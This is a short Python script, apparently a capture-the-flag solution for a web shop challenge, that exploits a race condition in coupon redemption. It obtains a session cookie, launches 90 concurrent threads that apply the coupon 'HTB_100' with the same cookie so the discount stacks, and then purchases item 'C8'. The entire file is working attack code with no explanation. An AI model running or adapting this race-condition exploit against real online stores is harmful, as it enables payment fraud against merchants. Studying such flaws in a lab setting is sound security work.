import requests
import sys
import os
import time 
import threading as t

def get_cookies(host):
    url = f'http://{host}/api/purchase'
    response = requests.post(url, headers={'Content-Type':'application/json'}, data="{\"item\":\"C8\"}", proxies={'http':'http://localhost:8080'})
    print('Cookie:' +response.text)
    return response.cookies.get_dict()

def do_coupon_request(host, cookies):
    url = f'http://{host}/api/coupons/apply'
    response = requests.post(url, headers={'Content-Type':'application/json'}, cookies=cookies, data="{\"coupon_code\":\"HTB_100\"}")
    print('Coupon:' +response.text)
    if response.status_code == 401:
        return False
    return True

def do_purchase_request(host, cookies):
    url = f'http://{host}/api/purchase'
    response = requests.post(url, headers={'Content-Type':'application/json'}, cookies=cookies, data="{\"item\":\"C8\"}")
    print('Purchase: '+response.text)



if __name__ == '__main__':
    host = sys.argv[1]
    flag = False
    
    cookies = get_cookies(host)
    time.sleep(1)
    for i in range(0,90):
        t.Thread(target=do_coupon_request, args=(host,cookies,)).start()

    time.sleep(5)
    do_purchase_request(host, cookies)






